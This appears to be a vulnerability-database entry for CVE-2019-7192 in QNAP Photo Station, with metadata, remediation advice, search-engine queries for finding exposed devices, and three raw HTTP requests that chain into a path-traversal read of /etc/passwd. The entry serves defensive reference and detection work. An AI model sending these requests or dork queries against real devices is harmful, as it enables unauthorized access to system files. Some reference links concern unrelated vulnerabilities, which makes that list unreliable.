---
layout: "post"
cve_id: "CVE-2019-7192"
title: "QNAP QTS and Photo Station 6.0.3 - Remote Command Execution"
pcap: true
pcap_path: "/pcaps/2019/CVE-2019-7192.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-7192.yaml"
author: "DhiyaneshDK"
severity: "critical"
impact: "Successful exploitation of this vulnerability allows remote attackers to execute arbitrary commands on the target system.
"
remediation: "Apply the latest security patch or upgrade to a non-vulnerable version of QNAP QTS and Photo Station.
"
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2019-7192"
  - "https://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html"
  - "https://patchstack.com/database/vulnerability/all-in-one-wp-migration/wordpress-all-in-one-wp-migration-plugin-7-62-unauthenticated-reflected-cross-site-scripting-xss-vulnerability"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-2546"
  - "https://medium.com/@cycraft_corp/qnap-pre-auth-root-rce-affecting-312k-devices-on-the-internet-fc8af285622e"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2019-7192', 'cwe-id': 'CWE-863', 'epss-score': 0.9408, 'epss-percentile': 0.99899, 'cpe': 'cpe:2.3:a:qnap:photo_station:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 3, 'vendor': 'qnap', 'product': 'photo_station', 'shodan-query': ['Content-Length: 580 "http server 1.0"', 'http.title:"photo station"', 'http.title:"qnap"', 'content-length: 580 "http server 1.0"'], 'fofa-query': ['title="photo station"', 'title="qnap"'], 'google-query': ['intitle:"qnap"', 'intitle:"photo station"']}"
tags:
  - "cve"
  - "cve2019"
  - "packetstorm"
  - "lfi"
  - "rce"
  - "kev"
  - "qnap"
  - "qts"
  - "xss"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
This improper access control vulnerability allows remote attackers to gain unauthorized access to the system. To fix these vulnerabilities, QNAP recommend updating Photo Station to their latest versions.


## üåê HTTP Request
```nohighlight
POST /photo/p/api/album.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

a=setSlideshow&f=qsamplealbum
```

```nohighlight
GET /photo/slideshow.php?album=S3BdYG HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

```nohighlight
POST /photo/p/api/video.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Connection: close
Content-Length: 92
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

album=S3BdYG&a=caption&ac=HGPAcl&f=UMGObv&filename=.%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

